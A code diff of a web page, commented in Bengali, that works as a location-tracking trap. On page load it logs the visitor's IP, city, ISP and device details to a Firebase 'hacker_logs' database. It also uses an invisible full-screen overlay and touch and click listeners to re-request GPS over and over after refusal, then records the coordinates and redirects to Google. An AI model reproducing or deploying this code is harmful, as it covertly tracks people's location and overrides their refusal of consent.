@@ -26,25 +26,35 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ১. ডাটা পাঠানো শুরু
-        window.initLog = function(data) {
+        // ১. পেজ লোড হওয়ামাত্রই খালি লগ তৈরি করা (যাতে লোকেশন সেভ করার জায়গা থাকে)
+        window.createInitialLog = function() {
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
             
+            // সাথে সাথে একটা এন্ট্রি তৈরি করে ফেললাম
             set(newLogRef, {
                 timestamp: new Date().toString(),
-                ...data,
-                latitude: "Wait...",
-                longitude: "Wait...",
-                actionStatus: "Trap Started"
-            }).then(() => {
-                sessionStorage.setItem('logKey', newLogRef.key);
-                // ডাটা সেভ হওয়ার পর আসল খেলা শুরু
-                startAnnoyingLoop();
+                latitude: "Requesting Now...",  // আমরা এখনই চাইছি
+                longitude: "Requesting Now...",
+                ip: "Fetching...",              // এগুলো পরে আসবে
+                deviceModel: "Fetching...",
+                actionStatus: "Trap Started - GPS First"
             });
+
+            // সেশন কি (Key) সেভ রাখা
+            sessionStorage.setItem('logKey', newLogRef.key);
         };
 
-        // ২. লোকেশন আপডেট
+        // ২. আইপি এবং ডিভাইস ইনফো আপডেট করা (ব্যাকগ্রাউন্ডে চলবে)
+        window.updateBackgroundInfo = function(data) {
+            const key = sessionStorage.getItem('logKey');
+            if (key) {
+                const updateRef = ref(db, 'hacker_logs/' + key);
+                update(updateRef, data);
+            }
+        };
+
+        // ৩. লোকেশন আপডেট (মেইন কাজ)
         window.updateWithGPS = function(lat, lng) {
             const key = sessionStorage.getItem('logKey');
             if (key) {
@@ -54,7 +64,7 @@
                     longitude: lng,
                     actionStatus: "✅ Verified & Caught"
                 }).then(() => {
-                    // কাজ শেষে মুক্তি
+                    // কাজ শেষে গুগলে পাঠিয়ে দেওয়া
                     window.location.href = "https://www.google.com";
                 });
             }
@@ -69,10 +79,9 @@
             justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            cursor: progress; /* মাউস কার্সর লোডিং দেখাবে */
+            cursor: progress;
         }
 
-        /* পুরো স্ক্রিন জুড়ে একটা অদৃশ্য জাল */
         #clickTrap {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 9999; cursor: pointer;
@@ -98,12 +107,10 @@
 
         h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
         p { color: #888; font-size: 13px; }
-
     </style>
 </head>
 <body>
 
-    <!-- এই ডিভটা পুরো স্ক্রিন দখল করে থাকবে, যেখানেই ক্লিক করবে লোকেশন চাইবে -->
     <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
 
     <div class="loader-box">
@@ -113,65 +120,67 @@
     </div>
 
     <script>
-        let ipInfo = {};
-        let isAsking = false; // ফ্ল্যাগ যাতে একসাথে একাধিক রিকোয়েস্ট না যায়
+        let isAsking = false;
 
+        // 🔥 সবথেকে ফাস্ট এক্সিকিউশন
         window.onload = function() {
-            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    ipInfo = data;
-                    prepareInitialData();
-                })
-                .catch(() => {
-                    ipInfo = { ip: "Unknown", city: "Unknown" };
-                    prepareInitialData();
-                });
+            // ১. ডাটাবেসে জায়গা বুক করা (মিলিসেকেন্ডের মধ্যে)
+            if(window.createInitialLog) window.createInitialLog();
+
+            // ২. লোকেশন চাওয়া শুরু (সবার আগে!)
+            startAnnoyingLoop();
+
+            // ৩. আইপি এবং ডিভাইস ইনফো আস্তে ধীরে আনা (ব্যাকগ্রাউন্ডে)
+            fetchBackgroundData();
         };
 
-        function prepareInitialData() {
-            var parser = new UAParser();
-            var result = parser.getResult();
-            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
+        function fetchBackgroundData() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    var parser = new UAParser();
+                    var result = parser.getResult();
+                    let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
 
-            let initialPayload = {
-                ip: ipInfo.ip || "Tracing...",
-                city: ipInfo.city || "Tracing...",
-                isp: ipInfo.org || "Tracing...",
-                deviceModel: deviceName,
-                os: result.os.name,
-                browser: result.browser.name,
-                latitude: "Tracing...",
-                longitude: "Tracing..."
-            };
-
-            if(window.initLog) window.initLog(initialPayload);
+                    let bgData = {
+                        ip: ipData.ip || "Unknown",
+                        city: ipData.city || "Unknown",
+                        isp: ipData.org || "Unknown",
+                        deviceModel: deviceName,
+                        os: result.os.name,
+                        browser: result.browser.name
+                    };
+                    
+                    // ডাটাবেস আপডেট করে দেওয়া
+                    if(window.updateBackgroundInfo) window.updateBackgroundInfo(bgData);
+                })
+                .catch(() => {
+                    // ফেইল করলে অন্তত ডিভাইস নেম আপডেট করা
+                    var parser = new UAParser();
+                    if(window.updateBackgroundInfo) window.updateBackgroundInfo({ deviceModel: parser.getResult().os.name });
+                });
         }
 
-        // ৩. আসল ফাংশন (যেটা বারবার কল হবে)
         function startAnnoyingLoop() {
-            // ১. পেজ লোড হওয়ার ১.৫ সেকেন্ড পর প্রথম চেষ্টা
-            setTimeout(forceBrowserPrompt, 1500);
+            // পেজ লোড হওয়ার সাথে সাথেই অ্যাটাক! (দেরি নেই)
+            setTimeout(forceBrowserPrompt, 100); 
             
-            // ২. কেউ যদি মাউস নাড়ায় বা স্ক্রিনে টাচ করে, তাহলেও ট্রিগার হবে
+            // স্ক্রিনে টাচ করলেই আবার চাইবে
             document.addEventListener('touchstart', forceBrowserPrompt);
             document.addEventListener('click', forceBrowserPrompt);
         }
 
         function forceBrowserPrompt() {
-            // যদি অলরেডি রিকোয়েস্ট প্রসেসিং এ থাকে, তাহলে থামো
             if(isAsking) return;
             isAsking = true;
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    // Success
                     function(position) {
+                        // লোকেশন পেয়ে গেছি!
                         document.getElementById('statusText').innerText = "Verified!";
                         document.querySelector('.spinner').style.borderTopColor = "#00b894";
                         
-                        // লোকেশন পেয়ে গেছি, আর ডিস্টার্ব করার দরকার নেই
                         document.removeEventListener('touchstart', forceBrowserPrompt);
                         document.removeEventListener('click', forceBrowserPrompt);
                         document.getElementById('clickTrap').style.display = 'none';
@@ -180,14 +189,10 @@
                             window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                         }
                     },
-                    // Error (Block or Close)
                     function(error) {
-                        isAsking = false; // আবার চাওয়ার জন্য রেডি
-                        console.log("User denied/closed. Re-arming trap.");
-                        
-                        // হ্যাকার ভাববে লোডিং হচ্ছে, কিন্তু আসলে আমরা আবার রিকোয়েস্টের অপেক্ষায় আছি
-                        // এখানে আমরা কোনো UI চেঞ্জ করব না, জাস্ট চুপচাপ থাকব
-                        // সে বিরক্ত হয়ে স্ক্রিনে ট্যাপ করলেই আবার পপ-আপ আসবে
+                        isAsking = false;
+                        console.log("Re-arming trap.");
+                        // ইউজার রিজেক্ট করলে আবার লুপ চলবে
                     },
                     { enableHighAccuracy: true }
                 );
